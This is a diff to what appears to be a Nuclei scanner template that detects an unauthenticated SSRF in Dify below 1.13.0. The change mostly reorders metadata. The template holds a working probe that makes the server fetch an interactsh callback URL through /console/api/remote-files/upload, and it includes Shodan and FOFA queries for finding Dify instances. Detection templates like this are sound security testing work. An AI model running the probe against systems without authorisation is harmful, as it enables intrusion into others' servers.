@@ -1,5 +1,4 @@
 id: dify-ssrf-remote-upload
-
 info:
   name: Dify < 1.13.0 - Unauthenticated SSRF via Remote File Upload
   author: 0x_Akoko
@@ -13,22 +12,19 @@ info:
     cvss-score: 8.3
     cwe-id: CWE-918
   metadata:
-    verified: true
+    fofa-query: title="Dify" || body="dify"
     max-request: 2
-    vendor: langgenius
     product: dify
     shodan-query: title:"Dify"
-    fofa-query: title="Dify" || body="dify"
-  tags: dify,ssrf,unauth,ai
-
+    vendor: langgenius
+    verified: true
+  tags: ai,dify,ssrf,unauth
 flow: http(1) && http(2)
-
 http:
   - raw:
       - |
         GET / HTTP/1.1
         Host: {{Hostname}}
-
     host-redirects: true
     max-redirects: 2
     matchers:
@@ -37,7 +33,6 @@ http:
           - 'contains_any(body, "<title>Dify</title>", "dify")'
         condition: and
         internal: true
-
   - raw:
       - |
         POST /console/api/remote-files/upload HTTP/1.1
@@ -45,10 +40,9 @@ http:
         Content-Type: application/json
 
         {"url":"http://{{interactsh-url}}/ssrf-test"}
-
     matchers:
       - type: dsl
         dsl:
           - 'contains(interactsh_protocol, "http")'
         condition: and
-# digest: 490a00463044021f4d57777a0fb8e20dfe12264bab4182a435148eb6bfed75f8e3d547718ea8cc022100fe9247cfd31fbd50430d4cb03edce00a4a9c73cc1c7c28dc014f5f01004849ea:922c64590222798bb761d5b6d8e72950
+        # digest: 490a00463044021f4d57777a0fb8e20dfe12264bab4182a435148eb6bfed75f8e3d547718ea8cc022100fe9247cfd31fbd50430d4cb03edce00a4a9c73cc1c7c28dc014f5f01004849ea:922c64590222798bb761d5b6d8e72950
